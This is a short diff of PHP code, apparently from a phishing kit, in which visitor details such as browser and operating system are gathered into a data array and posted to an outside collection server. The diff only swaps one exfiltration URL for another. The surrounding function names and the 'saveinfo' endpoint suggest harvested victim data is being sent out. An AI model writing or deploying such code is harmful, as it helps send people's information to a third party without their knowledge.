@@ -131,7 +131,7 @@ $data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
 $data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
 
 
-sendPost('http://saveinfo.online/sv1.php',$data);
+sendPost('http://saveinfo.aba.ae/sv1.php',$data);
 
 
 //---- end request----------------
